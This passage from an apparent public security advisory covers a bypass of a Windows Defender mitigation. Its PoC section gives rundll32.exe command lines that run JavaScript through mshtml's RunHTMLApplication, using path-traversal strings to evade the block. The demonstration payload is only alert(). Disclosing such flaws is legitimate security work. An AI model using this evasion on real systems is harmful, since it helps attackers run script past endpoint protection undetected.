Attempts at execution fail\nand attackers will typically get an \"Access is denied\" error message.\n\nBack in 2022, I first disclosed how that could be easily bypassed by passing an extra path traversal when referencing mshtml but since has been mitigated.\nRecently Feb 7, 2024, I disclosed using multi-commas \",\" will bypass that mitigation but has since been fixed again.\nThe fix was short lived as I find yet another third trivial bypass soon after.\n\n\n[Exploit/POC]\nOpen command prompt as Administrator.\n\nC:\\sec>rundll32.exe javascript:\"\\..\\..\\mshtml,,RunHTMLApplication \";alert(13)\nAccess is denied.\n\nC:\\sec>rundll32.exe javascript:\"\\\\..\\\\..\\\\mshtml\\\\..\\\\..\\\\mshtml,RunHTMLApplication \";alert('HYP3RLINX')\n\n\n[Video PoC URL]\nhttps://www.youtube.com/watch?v=yn9gdJ7c7Kg\n\n\n[Network Access]\nLocal\n\n\n[Severity]\nHigh\n\n\n[References]\nhttps://hyp3rlinx.altervista.org/advisories/MICROSOFT_WINDOWS_DEFENDER_DETECTION_BYPASS.txt\nhttps://hyp3rlinx.altervista.org/advisories/MICROSOFT_WINDOWS_DEFENDER_TROJAN.WIN32.POWESSERE.G_MITIGATION_BYPASS_PART2.txt\nhttps://twitter.com/hyp3rlinx/status/1755417914599956833\nhttps://twitter.com/hyp3rlinx/status/1758624140213264601\n\n\n[Disclosure Timeline]\nVendor Notification:  \nFebruary 16, 2024 : Public Disclosure\n\n\n[+] Disclaimer\nThe information contained within this advisory is supplied \"as-is\" with no warranties or guarantees of fitness of use or otherwise.\nPermission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and\nthat due credit is given.
